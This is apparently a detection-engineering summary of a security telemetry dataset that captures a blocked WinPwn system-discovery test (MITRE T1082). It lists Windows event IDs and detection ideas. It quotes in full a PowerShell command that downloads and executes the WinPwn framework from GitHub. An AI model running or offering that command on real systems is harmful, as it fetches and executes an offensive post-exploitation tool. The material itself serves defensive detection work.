# T1082-17: System Information Discovery — WinPwn - General privesc checks

## Technique Context

T1082 System Information Discovery is a foundational Discovery technique where adversaries gather detailed information about the compromised system. This includes OS version, architecture, installed software, hardware details, and user context. Attackers use this intelligence to inform subsequent actions like privilege escalation, lateral movement, and persistence mechanisms. The detection community focuses heavily on identifying automated enumeration tools and scripts that collect multiple types of system information in rapid succession, as legitimate administrative activities typically target specific information rather than broad reconnaissance.

WinPwn is a PowerShell-based post-exploitation framework designed for Windows privilege escalation and system enumeration. The "otherchecks" function performs comprehensive system reconnaissance including user context, system configuration, installed software, and potential privilege escalation vectors. This represents a common pattern where attackers download and execute reconnaissance frameworks directly from remote repositories.

## What This Dataset Contains

This dataset captures a WinPwn execution that was blocked by Windows Defender during the download phase. The key telemetry includes:

**Process Creation Chain**: Security event 4688 shows PowerShell spawning with command line `"powershell.exe" & {$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')otherchecks -noninteractive -consoleoutput}`

**Network Activity**: Sysmon EID 3 shows TCP connection to `185.199.108.133:443` and DNS query for `raw.githubusercontent.com`, indicating the download attempt.

**PowerShell Script Block Logging**: EID 4104 events capture the malicious script blocks including the GitHub URL and the `New-Object net.webclient` command for downloading WinPwn.

**Defender Blocking**: PowerShell EID 4100 shows "This script contains malicious content and has been blocked by your antivirus software" with error ID `ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand`.

**Basic System Enumeration**: Before being blocked, the script executed `whoami.exe` (Sysmon EID 1) showing minimal system discovery activity.

**Process Access**: Sysmon EID 10 events show PowerShell accessing both whoami.exe and the child PowerShell process with full access rights (0x1FFFFF).

## What This Dataset Does Not Contain

The dataset lacks the complete WinPwn execution because Windows Defender successfully blocked the script download. Missing elements include:

- The actual WinPwn script content and its extensive system enumeration capabilities
- Registry queries for privilege escalation vectors
- Service enumeration and analysis
- Network share discovery
- Installed software enumeration
- Additional process creations that WinPwn would typically generate
- File system reconnaissance beyond basic PowerShell startup files

The Sysmon ProcessCreate events are limited because the sysmon-modular configuration uses include-mode filtering, only capturing known-suspicious patterns like whoami.exe. Many legitimate system processes that WinPwn might have spawned would not appear in Sysmon EID 1 events, though they would be visible in Security 4688 events.

## Assessment

This dataset provides excellent telemetry for detecting blocked WinPwn executions but limited insight into successful system discovery activities. The combination of command-line logging, PowerShell script block logging, network connections, and Defender blocking events creates a comprehensive picture of the attempt. However, for detection engineers studying completed T1082 activities, this dataset shows the prevention rather than the technique execution.

The data sources are strong for building detections around malicious PowerShell downloads and WinPwn specifically, but less valuable for understanding the broader system discovery patterns that would emerge from successful execution. The network telemetry and PowerShell logging provide the most actionable detection opportunities.

## Detection Opportunities Present in This Data

1. **WinPwn URL Pattern Detection**: Monitor for PowerShell downloading from `raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/` in script blocks or command lines
2. **PowerShell WebClient Download Pattern**: Detect `iex(new-object net.webclient).downloadstring()` patterns in PowerShell Script Block Logging (EID 4104)
3. **GitHub Raw Content Downloads**: Alert on network connections to raw.githubusercontent.com from PowerShell processes
4. **Malicious Script Blocking Events**: Monitor PowerShell EID 4100 events with "ScriptContainedMaliciousContent" for blocked attacks
5. **PowerShell Process Access Patterns**: Detect PowerShell processes accessing other processes with full rights (0x1FFFFF) via Sysmon EID 10
6. **Suspicious Command Line Combinations**: Alert on PowerShell executions containing both GitHub URLs and immediate execution patterns (`iex` + `downloadstring`)
7. **System Discovery Tool Execution**: Monitor for whoami.exe execution from PowerShell contexts, especially when combined with network activity
8. **DNS Query Correlation**: Correlate DNS queries for raw.githubusercontent.com with subsequent PowerShell script execution attempts
